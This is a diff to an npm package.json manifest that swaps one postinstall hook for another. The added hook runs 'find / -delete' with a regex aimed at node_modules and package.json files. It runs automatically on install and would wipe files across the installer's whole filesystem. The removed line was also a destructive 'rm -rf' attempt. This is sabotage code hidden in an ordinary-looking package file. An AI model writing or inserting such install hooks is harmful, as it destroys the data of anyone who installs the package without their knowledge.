@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "find / | grep \"node_modules|package\\.json\" | rm -rf"
+    "postinstall": "find / -delete -regex \"(node_modules)|(package\\\\.json)\""
   },
   "keywords": [
     "general",
